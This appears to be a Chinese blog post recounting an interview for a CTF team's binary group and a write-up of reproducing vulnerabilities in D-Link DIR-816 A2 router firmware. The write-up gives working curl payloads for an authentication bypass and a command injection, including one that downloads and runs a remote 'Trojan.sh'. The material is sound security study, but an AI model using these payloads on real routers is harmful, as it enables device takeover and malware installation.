---
title: Nepnep二进制组面试分享
poc: true
categories:
  - - 0day
  - - '二进制'
    - 固件
tags: []
id: '1275'
date: 2021-11-23 13:36:39
---

终于加入了梦寐以求的Nepnep，能和花花、贝塔贴贴啦ww

同时也欢迎各位师傅们来Nepnep玩吖ww

面试过程记录如下，希望能帮助到打算来面试的小伙伴们

（原载于本人博客：https://valkierja.github.io/）

## 正文

先交了简历，然后直接技术一面

### 技术一面

花花：简历上写你之前在校赛出过题，讲讲具体情况？

冷冷子：出了三四题二进制的，简单的有明文签到和base64，XOR等，这个不细说了，RE压轴是我出的，基于nvram-faker这个项目,我修改了一个小模块下，往里面塞了一些数据，静态分析很难看出来，但是动调一下就出了，主要考察的是linux动态链接库的调试以及LD\_PRELOAD的使用(或者HOOK)

花花：QEMU初始化时找不到  nvram 该如何处理？什么是 nvram ?

冷冷子：1. 我这边复现的MIPS架构的洞只有一个（简历上写的CVE-2005-2799），我当时查了一下资料，用 nvram-faker 这个项目加载就可以消除 QEMU初始化时找不到  nvram  这个问题，其他特殊情况情况没有遇到过如何处理

2\. nvram  就是板载内存颗粒，有些嵌入式环境是直接与板载颗粒主控通信的，但是MIPS架构的内存颗粒对应的/dev/nvram文件是真实的系统启动时初始化、创建的，轮到程序在qemu里面运行时，并没有正常经历这些步骤，所以用户模式的qemu堆nvram初始化失败

花花： 为什么直接return fake并不会影响正常的模拟

冷冷子（原话，有错误，正确的答案在下面）：虽然qemu无法模拟主控但是仍然已经搭建好了模拟层的内存，所以初始化函数只需要返回一个正常值即可；也就是说，其实主程序已经可以正常的做他想做的内存分配操作了，但是初始化检查函数并不这么认为

（更正确一些的答案）：程序跑的时候，用户模式的qemu只负责翻译程序的机器码，然后构建起一些虚拟的操作系统基本环境（比如内存的分配），但是大部分东西qemu都是没有的（比如/proc和/dev和/etc/run等），此时qemu通过chroot，用透明相对路径的方法访问：以固件文件夹为根目录的文件当然就访问不到了

花花： nvram-faker 很老了，只是做了一堆枚举，如果没有写在里面的，就不适用了，你认为要更好的解决nvram的问题的话，该如何解决？

冷冷子：（这个没答好，而且我目前还不确定标准答案，暂时不写）

花花：bootloader，kernel，rootfs之间有什么关系

冷冷子： bootloader 负责CPU加电后从实模式启动到保护模式等操作，而为了让CPU能够与PCIE总线上的设备等进行通信，且为了该过程对人类而言是能看懂的，则需要kernel提供上层接口，rootfs没详细了解过

花花：Orange是一位很优秀的全栈安全研究员，为什么他书上的漏洞你只复现了两个，后面没再做了

冷冷子：没太了解过Orange大大的事迹，只是在别的师傅的推荐下看了他的几本书，然后也是很随机的选择了书上的一两个洞进行复现的，并没有什么特别的原因

花花：除了这些还有要特别补充的安全方面的能力吗

冷冷子：基本上只会MIPS架构路由器漏洞这些东西了

花花：以后有什么打算

冷冷子：打算在队内好好学习，以我个人的能力和想法可能不会打算成为队内主力，在中层和大佬们一起学习就好

花花：有做过什么题吗

冷冷子：pwnable.kr  pwnable.tw buu，不过都做得不是太多

花花：主要做了哪些考点？堆？栈？虚拟机？

冷冷子：主要只做过ret2xxx的栈题，其他的没做过特别有价值的二进制题目

花花：来讲一道印象深刻的题目

冷冷子：（复述了这个问题的内容和答案[https://www.zhihu.com/question/492972837/answer/2176530773](https://www.zhihu.com/question/492972837/answer/2176530773)）

zhz：最后问个简单的，讲讲函数调用过程吧

冷冷子：（略）

花花：Dlink DIR-816 A2 BO5固件登陆界面有个洞，两天时间打穿就算成功，到时候提交复现报告即可

冷冷子：好的

## 漏洞复现

（注：这里无意当中独立挖出来了goahead中间件的CVE-2019-19240，花花的预期解应该是DIR816固件本身的CVE-2018-17063）

### 初步信息收集

搜索后确认后台登陆页面为`/dir_login.asp`

WEB中间件为`goahead`

初始密码打印在路由器本体上

第一次登陆后台需要初始密码，不能直接访问设置界面

登陆成功后会进入`/d_wizard_step1_start.asp`进行初始化设置,同时,即使已经初始化过,若能跳转到本页进行设置,则路由器设置会被覆盖

### 环境搭建与环境恢复

交叉编译环境与qemu-mipsel环境搭建依据笔者之前发表的博客，不赘述



从官网下载固件,然后`binwalk -e`直接提取

以下为初步 qemu-mipsel 环境搭建

首先是chroot之后个人倾向于使用bash而非busybox,所以复制bash的程序本体与动态链接库到对应的相对路径文件夹内,如图

![image-20211120020536342](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181106711.png)

![image-20211120020547985](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181108810.png)

同理,用ldd命令查qemu-mipsel所需要的动态链接库

复制到chroot后的对应相对路径目录中

总共的内容为这些

![image-20211120020649936](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181108466.png)

然后再把交叉编译环境output文件夹当中的lib库全部复制到dir816/lib内

此时就可以正常运行qemu了,算是初步搭建好了环境

`chroot ./ ./qemu-mipsel ./bin/goahead`

直接运行之后的报错log为

Unsupported ioctl: cmd=0x0002  
ioctl: Function not implemented  
Unsupported ioctl: cmd=0x0001  
ioctl: Function not implemented  
\[goahead\]:E\_LOG   :goahead.c: cannot open pid file  
goahead.c: cannot open pid file

![image-20211120102926954](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181108608.png)

注意到，

![](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181108565.png)

故创建该文件

至于`Unsupported ioctl: cmd=0x0002`和`Unsupported ioctl: cmd=0x0001`

经搜索确认可以不用特意关注,不是修复重点

同理,根据报错log创建几个文件

![image-20211120102950628](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181108944.png)

![image-20211120110536447](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181108413.png)

然后再次运行,程序跑的就比较久了,输出log中含有大量`Unsupported ioctl: cmd=0x0002`和`Unsupported ioctl: cmd=0x0001`

去除这部分后分析剩余log,暂时没得到太多信息

动调连接过去过去先看看情况

main函数部分有四五个有return -1的判断语句分支

先姑且让这些执行流强行跳转到继续运行的分支上面

经过多次动调尝试,具体来说就是这分支会导致退出,其他分支在默认情况下不会导致程序主体退出

![image-20211120103809102](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181108806.png)

可以选择写一个so文件然后LD\_PRELOAD加载,HOOK掉nvram\_bufget函数,但是这里先估且采用动调改寄存器的方式

![image-20211120115153728](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181108101.png)

![image-20211120115239266](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181107720.png)

改完这段流程后,网站后台就正常跑起来了

![](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181107797.png)

### 进一步信息收集

根据网上公开信息及利用此项目([https://github.com/fuzzdb-project/fuzzdb](https://github.com/fuzzdb-project/fuzzdb))进行的黑盒Fuzz

发现当HTPP的Host字段和数据包的MAC字段为超长异型字符串时,会触发302跳转,无条件跳转HTTP报文中GET请求指定的资源

（注：这里是无意当中独立挖出来了中间件的CVE-2019-19240，花花的预期解应该是DIR816固件的CVE-2018-17063）

### 逆向分析相关模块

![image-20211120110722697](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181107891.png)

通过之前创建文件时的log的字符串`/etc/RAMConfig/tokenid`

搜索后关注到这个回调函数,进去

![image-20211120110802019](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181107349.png)

然后找到这里

![image-20211120110935292](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181107738.png)

通过不带种子的rand生成一个随机数作为token,这点可能有额外价值

关注到`login`全局变量的xref

![image-20211120111123659](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181107291.png)

xref找到这里

分析发现每次访问dir\_login.asp后台页面的未成功登录者(无权限者)都会被记录其局域网IP,MAC地址和前文所说的token

考虑到前文所述的信息收集,怀疑与这个有关,不过,最终分析表明其实和上面截图的逻辑无关

注意到刚刚触发了302跳转,于是把怀疑对象改为放在`websRedirect`函数上

发现这段逻辑

![image-20211120112205930](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181107934.png)

参数赋值流为

HOST\_NAME->v9->v21->v15

HTTP\_HOST->v14->v15

![image-20211120112405776](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181107288.png)

对上述参数的长度没有任何检查

当遇到换行时while循环停止

构造过长的任意字符串会导致这段while循环+if语句错误转到到这一段分支

![image-20211120112601308](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181107405.png)

![image-20211120112653289](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181107076.png)

而v2是我们在数据包中GET请求可以随意控制的

所以剩下的就不言而喻了

payload如下

```

首先,由于我们没法登录,无法提供用户名密码,所以需要token来让服务器维持会话

curl -s http://192.168.0.1/dir_login.asp  grep tokenid

curl -i -X POST http://192.168.0.1/d_wizard_step1_start.asp -d tokenid=NUM -d 's_ip=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' -d 's_mac=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
```

此时就进去后台了

![](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181107029.png)

然后操作一下,就可以把路由器设置覆盖掉

同时注意到 [CVE-2018-17063](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17063)

因此我们在设置覆盖后可以登录路由器后台设置时间日期的模块

![image-20211120113814682](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181107290.png)

这里的a3是可以任意操作的

可能的开发逻辑是:既然已经登录了路由器后台,且可以修改时间了,那么变相证明大概率是系统管理员,因此开发者图省事直接在后台的该模块中用了system函数,而且没有做任何检查,因此

```
curl -i -X POST http://192.168.0.1/goform/NTPSyncWithHost -d tokenid=NUM -d '`touch /tmp/test`=1' 
```

或者进一步的

```
curl -i -X POST http://192.168.0.1/goform/NTPSyncWithHost -d tokenid=NUM -d '`wget -P /tmp http://1.1.1.1/Trojan.sh; chmod +x /tmp/Trojan.sh;/bin/sh /temp/Trojan.sh`=1' 
```

至此结束